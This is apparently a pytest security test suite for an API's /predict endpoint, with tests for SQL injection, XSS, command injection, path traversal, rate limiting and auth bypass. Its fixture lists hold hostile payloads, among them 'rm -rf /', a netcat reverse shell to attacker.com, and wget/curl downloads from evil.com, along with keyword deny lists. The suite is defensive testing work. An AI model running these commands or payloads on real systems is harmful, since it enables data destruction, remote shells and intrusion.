"""
Security tests for guardrails and input validation.

Tests security measures including:
- SQL injection prevention
- XSS attack prevention
- Command injection blocking
- Path traversal protection
- Rate limiting enforcement
- Input sanitization
- Authentication bypass attempts
"""

import pytest
import asyncio
import time
from httpx import AsyncClient
from unittest.mock import Mock, patch
import json

# Mock imports - replace with actual imports when modules exist
# from app.utils.guardrails import GuardrailsValidator
# from app.main import app


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention."""

    @pytest.fixture
    def sql_injection_payloads(self):
        """Common SQL injection attack patterns."""
        return [
            "'; DROP TABLE users; --",
            "' UNION SELECT password FROM admin --",
            "1' OR '1'='1",
            "'; DELETE FROM sessions; --",
            "' AND SLEEP(5) --",
            "' UNION ALL SELECT NULL,NULL,NULL,user(),NULL --",
            "admin'/*",
            "' OR 1=1#",
            "'; EXEC sp_configure 'show advanced options', 1 --",
            "' UNION SELECT @@version --"
        ]

    @pytest.mark.asyncio
    async def test_sql_injection_in_prompt(
            self,
            async_client,
            sql_injection_payloads,
            sample_openapi_spec):
        """Test SQL injection prevention in prompt field."""
        for payload in sql_injection_payloads:
            request_data = {
                "prompt": payload,
                "recent_events": [],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            # Should either sanitize and process (200) or reject (400/422)
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                # If processed, response should not contain SQL injection
                # artifacts
                response_text = response.text.lower()
                dangerous_keywords = [
                    "drop table",
                    "delete from",
                    "union select",
                    "exec sp_"]

                for keyword in dangerous_keywords:
                    assert keyword not in response_text

    @pytest.mark.asyncio
    async def test_sql_injection_in_events(
            self,
            async_client,
            sql_injection_payloads,
            sample_openapi_spec):
        """Test SQL injection prevention in event data."""
        malicious_events = []
        for i, payload in enumerate(
                sql_injection_payloads[:5]):  # Test first 5 payloads
            malicious_events.append({
                "endpoint": f"/users/{payload}",
                "method": "GET",
                "timestamp": "2023-01-01T10:00:00Z"
            })

        request_data = {
            "prompt": "Get user data",
            "recent_events": malicious_events,
            "openapi_spec": sample_openapi_spec,
            "k": 3
        }

        response = await async_client.post("/predict", json=request_data)

        # Should handle malicious events safely
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            response_text = response.text.lower()
            assert "drop table" not in response_text
            assert "union select" not in response_text


class TestXSSPrevention:
    """Test XSS attack prevention."""

    @pytest.fixture
    def xss_payloads(self):
        """Common XSS attack patterns."""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>click me</div>",
            "<a href='javascript:alert(1)'>link</a>",
            "';alert('xss');//",
            "<script>document.cookie</script>"
        ]

    @pytest.mark.asyncio
    async def test_xss_prevention_in_prompt(
            self, async_client, xss_payloads, sample_openapi_spec):
        """Test XSS prevention in prompt field."""
        for payload in xss_payloads:
            request_data = {
                "prompt": payload,
                "recent_events": [],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                response_text = response.text
                # Check that dangerous scripts are not echoed back
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
                assert "onload=" not in response_text

    @pytest.mark.asyncio
    async def test_response_content_type_security(
            self, async_client, sample_openapi_spec):
        """Test that responses have secure content type headers."""
        request_data = {
            "prompt": "normal request",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 3
        }

        response = await async_client.post("/predict", json=request_data)

        if response.status_code == 200:
            # Should have secure content type
            content_type = response.headers.get("content-type", "")
            assert "application/json" in content_type

            # Should have XSS protection headers
            assert "X-Content-Type-Options" in response.headers
            assert response.headers.get("X-Content-Type-Options") == "nosniff"


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    @pytest.fixture
    def command_injection_payloads(self):
        """Common command injection patterns."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "`id`",
            "$(whoami)",
            "; wget http://evil.com/malware.sh",
            "| nc -e /bin/sh attacker.com 4444",
            "; curl -o /tmp/shell http://evil.com/shell",
            "&& python -c \"import os; os.system('ls')\""
        ]

    @pytest.mark.asyncio
    async def test_command_injection_prevention(
            self,
            async_client,
            command_injection_payloads,
            sample_openapi_spec):
        """Test command injection prevention in various fields."""
        for payload in command_injection_payloads:
            request_data = {
                "prompt": f"Execute command {payload}",
                "recent_events": [
                    {"endpoint": f"/admin/exec{payload}", "method": "POST"}
                ],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            # Should reject or sanitize command injection attempts
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                response_text = response.text.lower()
                dangerous_commands = [
                    "rm -rf", "cat /etc/passwd", "whoami", "wget", "curl"]

                for cmd in dangerous_commands:
                    assert cmd not in response_text


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    @pytest.fixture
    def path_traversal_payloads(self):
        """Common path traversal patterns."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/var/www/../../etc/passwd"
        ]

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(
            self,
            async_client,
            path_traversal_payloads,
            sample_openapi_spec):
        """Test path traversal prevention."""
        for payload in path_traversal_payloads:
            request_data = {
                "prompt": f"Access file {payload}",
                "recent_events": [
                    {"endpoint": f"/files/{payload}", "method": "GET"}
                ],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                response_text = response.text.lower()
                # Should not contain evidence of successful traversal
                assert "etc/passwd" not in response_text
                assert "system32" not in response_text


class TestRateLimiting:
    """Test rate limiting security measures."""

    @pytest.mark.asyncio
    async def test_rate_limiting_per_ip(
            self, async_client, sample_openapi_spec):
        """Test IP-based rate limiting."""
        request_data = {
            "prompt": "test request",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 1
        }

        # Make rapid requests
        responses = []
        for i in range(20):  # Assume limit is 10 per minute
            response = await async_client.post("/predict", json=request_data)
            responses.append(response)

        # Should start rate limiting after threshold
        rate_limited_count = sum(1 for r in responses if r.status_code == 429)
        successful_count = sum(1 for r in responses if r.status_code == 200)

        assert rate_limited_count > 0  # Should have some rate limited requests
        assert successful_count <= 10  # Should not exceed limit

        # Check rate limit headers
        rate_limited_response = next(
            (r for r in responses if r.status_code == 429), None)
        if rate_limited_response:
            assert "X-RateLimit-Limit" in rate_limited_response.headers
            assert "X-RateLimit-Remaining" in rate_limited_response.headers
            assert "Retry-After" in rate_limited_response.headers

    @pytest.mark.asyncio
    async def test_rate_limiting_bypass_attempts(
            self, async_client, sample_openapi_spec):
        """Test attempts to bypass rate limiting."""
        request_data = {
            "prompt": "test request",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 1
        }

        # Try various bypass techniques
        bypass_headers = [
            {"X-Forwarded-For": "192.168.1.100"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Originating-IP": "172.16.0.1"},
            {"User-Agent": "DifferentBot/1.0"},
            {"X-Forwarded-For": "1.1.1.1, 2.2.2.2, 3.3.3.3"}
        ]

        for headers in bypass_headers:
            # Make requests with bypass headers
            responses = []
            for i in range(15):
                response = await async_client.post("/predict", json=request_data, headers=headers)
                responses.append(response)

            # Should still be rate limited
            rate_limited_count = sum(
                1 for r in responses if r.status_code == 429)
            assert rate_limited_count > 0  # Bypass should not work


class TestInputValidationSecurity:
    """Test input validation security measures."""

    @pytest.mark.asyncio
    async def test_oversized_payload_protection(self, async_client):
        """Test protection against oversized payloads."""
        # Create extremely large payload
        large_prompt = "A" * (10 * 1024 * 1024)  # 10MB string
        large_events = [{"endpoint": "/test", "method": "GET"}] * 10000

        large_spec = {
            "openapi": "3.0.0",
            "info": {"title": "Large API", "version": "1.0.0"},
            "paths": {}
        }

        # Add many endpoints
        for i in range(10000):
            large_spec["paths"][f"/endpoint_{i}"] = {
                "get": {"operationId": f"get{i}", "description": "A" * 1000}
            }

        request_data = {
            "prompt": large_prompt,
            "recent_events": large_events,
            "openapi_spec": large_spec,
            "k": 3
        }

        response = await async_client.post("/predict", json=request_data)

        # Should reject oversized payload
        # Payload Too Large or Unprocessable Entity
        assert response.status_code in [413, 422]

    @pytest.mark.asyncio
    async def test_null_byte_injection(
            self, async_client, sample_openapi_spec):
        """Test null byte injection prevention."""
        null_byte_payloads = [
            "test\x00malicious",
            "normal\x00\x01\x02string",
            "\x00../../../etc/passwd",
            "file.txt\x00.jpg"
        ]

        for payload in null_byte_payloads:
            request_data = {
                "prompt": payload,
                "recent_events": [{"endpoint": f"/test/{payload}"}],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            # Should handle null bytes safely
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                # Response should not contain null bytes
                assert "\x00" not in response.text

    @pytest.mark.asyncio
    async def test_unicode_normalization_attacks(
            self, async_client, sample_openapi_spec):
        """Test Unicode normalization attack prevention."""
        unicode_payloads = [
            "adsᵒᶠᵗʷᵃʳᵉ",  # Homograph attack
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            "../../etc/passwd",  # Using Unicode equivalents
            # Encoded angle brackets
            "script\u003Ealert('xss')\u003C/script\u003E",
        ]

        for payload in unicode_payloads:
            request_data = {
                "prompt": payload,
                "recent_events": [],
                "openapi_spec": sample_openapi_spec,
                "k": 3
            }

            response = await async_client.post("/predict", json=request_data)

            # Should handle Unicode attacks safely
            assert response.status_code in [200, 400, 422]


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(
            self, async_client, sample_openapi_spec):
        """Test various authentication bypass attempts."""
        bypass_headers = [
            {"Authorization": "Bearer fake_token"},
            {"X-User-ID": "admin"},
            {"X-Admin": "true"},
            {"Cookie": "session=admin; authenticated=true"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
        ]

        request_data = {
            "prompt": "Access admin functions",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 3
        }

        for headers in bypass_headers:
            response = await async_client.post("/predict", json=request_data, headers=headers)

            # Should not grant unauthorized access
            # This depends on whether authentication is required for the
            # predict endpoint
            assert response.status_code in [200, 401, 403]

    @pytest.mark.asyncio
    async def test_session_fixation_prevention(self, async_client):
        """Test session fixation attack prevention."""
        # Attempt to set session cookie
        malicious_cookies = {
            "session": "attacker_controlled_session_id",
            "PHPSESSID": "malicious_session",
            "JSESSIONID": "fixed_session_id"
        }

        response = await async_client.get("/health", cookies=malicious_cookies)

        # Should not accept pre-set session cookies or should regenerate them
        set_cookie_header = response.headers.get("set-cookie", "")
        if set_cookie_header:
            # If cookies are set, they should be different from the malicious
            # ones
            assert "attacker_controlled_session_id" not in set_cookie_header
            assert "malicious_session" not in set_cookie_header


class TestSecurityHeaders:
    """Test security headers implementation."""

    @pytest.mark.asyncio
    async def test_security_headers_present(self, async_client):
        """Test that required security headers are present."""
        response = await async_client.get("/health")

        required_security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Content-Security-Policy": lambda x: x is not None
        }

        for header, expected_value in required_security_headers.items():
            assert header in response.headers

            if callable(expected_value):
                assert expected_value(response.headers[header])
            else:
                assert response.headers[header] == expected_value

    @pytest.mark.asyncio
    async def test_information_disclosure_prevention(self, async_client):
        """Test that sensitive information is not disclosed."""
        response = await async_client.get("/health")

        # Should not reveal server information
        server_header = response.headers.get("server", "").lower()
        sensitive_info = ["apache", "nginx", "iis", "python", "uvicorn"]

        for info in sensitive_info:
            assert info not in server_header

        # Should not have debug headers in production
        debug_headers = [
            "X-Debug-Token",
            "X-Debug-Token-Link",
            "X-Symfony-Profiler-Token"]
        for header in debug_headers:
            assert header not in response.headers


class TestSecurityLogging:
    """Test security event logging."""

    @pytest.mark.asyncio
    async def test_malicious_request_logging(
            self, async_client, sample_openapi_spec):
        """Test that malicious requests are logged."""
        malicious_request = {
            "prompt": "'; DROP TABLE users; --",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 3
        }

        with patch("app.utils.security_logger.log_security_event") as mock_logger:
            response = await async_client.post("/predict", json=malicious_request)

            # Should log security events
            mock_logger.assert_called()

            # Check that the log includes relevant information
            logged_calls = mock_logger.call_args_list
            assert any("sql injection" in str(call).lower()
                       for call in logged_calls)

    @pytest.mark.asyncio
    async def test_rate_limit_violation_logging(
            self, async_client, sample_openapi_spec):
        """Test that rate limit violations are logged."""
        request_data = {
            "prompt": "test request",
            "recent_events": [],
            "openapi_spec": sample_openapi_spec,
            "k": 1
        }

        with patch("app.utils.security_logger.log_rate_limit_violation") as mock_logger:
            # Make requests to trigger rate limiting
            for i in range(15):
                await async_client.post("/predict", json=request_data)

            # Should log rate limit violations
            assert mock_logger.call_count > 0
